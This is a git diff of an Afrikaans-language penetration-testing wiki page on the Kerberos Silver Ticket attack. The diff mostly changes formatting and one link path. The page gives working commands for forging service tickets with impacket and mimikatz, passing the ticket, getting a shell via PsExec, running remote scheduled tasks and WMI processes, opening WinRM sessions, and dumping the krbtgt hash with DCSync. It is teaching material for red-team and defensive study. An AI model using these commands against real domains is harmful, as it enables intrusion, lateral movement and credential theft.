@@ -1,4 +1,4 @@
-# Silwermatriek
+# Silver Ticket
 
 <details>
 
@@ -27,12 +27,15 @@ Die **Silwermatriek**-aanval behels die uitbuiting van dienskaartjies in Aktiewe
 Vir kaartjie-vervaardiging word verskillende gereedskap gebruik gebaseer op die bedryfstelsel:
 
 ### Op Linux
+
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
+
 ### Op Windows
+
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -44,6 +47,7 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
+
 Die CIFS-diens word uitgelig as 'n algemene teiken om toegang tot die slagoffer se lêersisteem te verkry, maar ander dienste soos HOST en RPCSS kan ook uitgebuit word vir take en WMI-navrae.
 
 ## Beskikbare Dienste
@@ -52,10 +56,10 @@ Die CIFS-diens word uitgelig as 'n algemene teiken om toegang tot die slagoffer 
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
 | PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Afhanklik van OS ook:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In sommige gevalle kan jy net vra vir: WINRM</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In sommige gevalle kan jy net vra vir: WINRM</p>  |
 | Geskeduleerde Take                         | HOST                                                                       |
-| Windows Lêerdeling, ook psexec              | CIFS                                                                       |
-| LDAP-operasies, ingesluit DCSync            | LDAP                                                                       |
+| Windows Lêerdeling, ook psexec             | CIFS                                                                       |
+| LDAP-operasies, ingesluit DCSync           | LDAP                                                                       |
 | Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
 | Goue Kaartjies                             | krbtgt                                                                     |
 
@@ -76,14 +80,17 @@ In die volgende voorbeelde, laat ons aanvaar dat die kaartjie verkry is deur die
 ### CIFS
 
 Met hierdie kaartjie sal jy in staat wees om toegang tot die `C$` en `ADMIN$` vouer te verkry via **SMB** (indien blootgestel) en lêers na 'n deel van die afgeleë lêersisteem te kopieer deur iets soos:
+
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
+
 ### GASHEER
 
 Met hierdie toestemming kan jy geskeduleerde take op afgeleë rekenaars genereer en willekeurige bevele uitvoer:
+
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -95,9 +102,11 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
+
 ### GAS + RPCSS
 
 Met hierdie kaartjies kan jy **WMI uitvoer in die slagoffer se stelsel**:
+
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -107,24 +116,29 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
+
 Vind **meer inligting oor wmiexec** op die volgende bladsy:
 
-{% content-ref url="../ntlm/wmicexec.md" %}
-[wmicexec.md](../ntlm/wmicexec.md)
+{% content-ref url="../lateral-movement/wmicexec.md" %}
+[wmicexec.md](../lateral-movement/wmicexec.md)
 {% endcontent-ref %}
 
 ### GAS + WSMAN (WINRM)
 
 Met winrm-toegang oor 'n rekenaar kan jy **daarop toegang kry** en selfs 'n PowerShell kry:
+
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
+
 ### LDAP
 
 Met hierdie voorreg kan jy die DC-databasis dump met **DCSync**:
+
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
+
 **Leer meer oor DCSync** op die volgende bladsy:
 
 ## Verwysings
